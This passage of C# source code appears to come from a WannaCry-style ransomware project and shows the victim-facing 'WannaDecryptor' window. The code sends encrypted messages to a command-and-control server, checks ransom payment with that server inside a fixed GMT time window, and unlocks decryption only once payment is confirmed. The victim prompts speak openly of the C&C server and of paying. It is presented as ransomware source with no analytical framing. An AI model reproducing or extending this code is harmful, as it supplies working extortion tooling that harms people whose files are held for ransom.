            CU.ShowDialog();
            string message = CU.WriteMessage().Replace("\r\n", "&;E");
            if (!message.Equals(""))
            {
                Thread Write = new Thread(delegate ()
                {
                    try
                    {
                        message = message.Substring(0, message.Length - 3);
                        // Send Message
                        string WANNACRY_SEND_MESSAGE_RESULT = "";
                               WANNACRY_SEND_MESSAGE_RESULT = Client.Connection(
                               WANNACRY_MAIN_SERVER_IP,
                               int.Parse(WANNACRY_MAIN_SERVER_PORT),
                                   "[AES]" +
                                   Client.AESEncrypt(
                                   "SEND_MESSAGE" + "&;SPT" + message,
                                   WANNACRY_MAIN_SERVER_SSL_KEY) +
                                   "&" + WANNACRY_MAIN_SERVER_CLIENT_ID);
                        if (WANNACRY_SEND_MESSAGE_RESULT.Equals("EXCEPTION") || WANNACRY_SEND_MESSAGE_RESULT == null)
                        {
                            MessageBox.Show("An error occurred while sending the message. Please try again in a momentarily.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                        }
                        else
                        {
                            WANNACRY_MESSAGE_BASE64_PATH.Add(WANNACRY_SEND_MESSAGE_RESULT);
                            string all_write = ""; string temp_write = "";
                            foreach(string path in WANNACRY_MESSAGE_BASE64_PATH)
                            {
                                temp_write = Client.AESEncrypt(path, WANNACRY_FILE_MESSAGE_INFO_KEY);
                                if (all_write.Equals("")) all_write = temp_write;
                                else all_write = all_write + "&" + temp_write;
                            }
                            File.WriteAllText(WANNACRY_FILE_MESSAGE_INFO_NAME, all_write);
                            MessageBox.Show("Message sent successfully!", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Information);
                        }
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("An error occurred while sending the message. Please try again in a momentarily.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                });
                Write.Start();
            }
        }
        private void SendMessage_M_E(object sender, MouseEventArgs e)
        {
            try
            {
                Mouse.OverrideCursor = Cursors.Hand;
            }
            catch (Exception) { }
        }
        private void SendMessage_M_L(object sender, MouseEventArgs e)
        {
            try
            {
                Mouse.OverrideCursor = Cursors.Arrow;
            }
            catch (Exception) { }
        }
        // Check Payment button
        private void Check_Payment_Button(object sender, RoutedEventArgs e)
        {
            try
            {
                if (!WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF)
                {
                    string command = "[AES]" +
                                 Client.AESEncrypt(
                                 "CHECK_PAYMENT",
                                 WANNACRY_MAIN_SERVER_SSL_KEY) +
                                 "&" + WANNACRY_MAIN_SERVER_CLIENT_ID;
                    DateTime Time_UTC = DateTime.Now.ToUniversalTime();
                    string result = "";
                    int Time_UTC_H = int.Parse(Time_UTC.ToString("HH"));
                    if (9 <= Time_UTC_H && 11 >= Time_UTC_H)
                    {
                        Check_Payment CP = new Check_Payment(WANNACRY_MAIN_SERVER_IP, int.Parse(WANNACRY_MAIN_SERVER_PORT), command);
                        CP.ShowDialog();
                        result = CP._result();
                    }
                    else
                    {
                        if (MessageBox.Show("Not time to confirm payment!\r\n\r\nThe current time is not 9 am to 11 am Greenwich Mean Time. If payment confirmation is not made at the best time, payment verification may not be done properly.\r\n\r\nIf we proceed with payment confirmation as it is, please click 'Yes' or 'No' and wait for Greenwich Mean Time from 9:00 a.m. to 11:00 am.\r\n\r\nGMT/UTC Time: " + Time_UTC.ToString("yyyy/MM/dd HH:mm:ss"), "@WannaDecryptor@", MessageBoxButton.YesNo, MessageBoxImage.Information) == MessageBoxResult.Yes)
                        {
                            Check_Payment CP = new Check_Payment(WANNACRY_MAIN_SERVER_IP, int.Parse(WANNACRY_MAIN_SERVER_PORT), command);
                            CP.ShowDialog();
                            result = CP._result();
                        }
                    }

                    if (!result.Equals(""))
                    {
                        if (result.Equals("true"))
                        {
                            WANNACRY_CLIENT_DATA_CHECK_PAYMENT = true;
                            WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                            MessageBox.Show("Payment confirmed!\r\n\r\nFrom now on, you can decrypt the file. (NOTE: When you run a Decrypt operation, WannaDecryptor cannot be run again.)Press the Decrypt button to try.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Information);
                        }
                        else
                        {
                            WANNACRY_CLIENT_DATA_CHECK_PAYMENT = false;
                            MessageBox.Show("Payment failed to confirm!\r\n\r\nIt may be a communication problem with C&C server. Or, the WarnerCry data file in the local file may be damaged or in the process of not being paid yet. Please make the payment and try again between 9:00 a.m. and 11:00 a.m. Greenwich Mean Time.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                        }
                    }
                }
            }
            catch (Exception) { }
        }
        // Decrypt button
        private void Decrypt_Button(object sender, RoutedEventArgs e)
        {
            try
            {
                string command = "[AES]" + Client.AESEncrypt(
                    "DECRYPT",
                    WANNACRY_MAIN_SERVER_SSL_KEY) + "&" + WANNACRY_MAIN_SERVER_CLIENT_ID;
                Decrypt decrypt = new Decrypt(WANNACRY_MAIN_SERVER_IP,
                    WANNACRY_MAIN_SERVER_PORT,
                    command,
                    WANNACRY_FREE_DECRYPT_FILE_LIST,
                    WANNACRY_FREE_DECRYPT_FILE_KEY,
                    WANNACRY_FREE_DECRYPT_CHECK_TOF,
                    WANNACRY_CLIENT_DATA_CHECK_PAYMENT,
                    WANNACRY_FILE_ENCRYPTION_PATH);
                decrypt.ShowDialog();
            }
            catch (Exception) { }
        }
    }
}
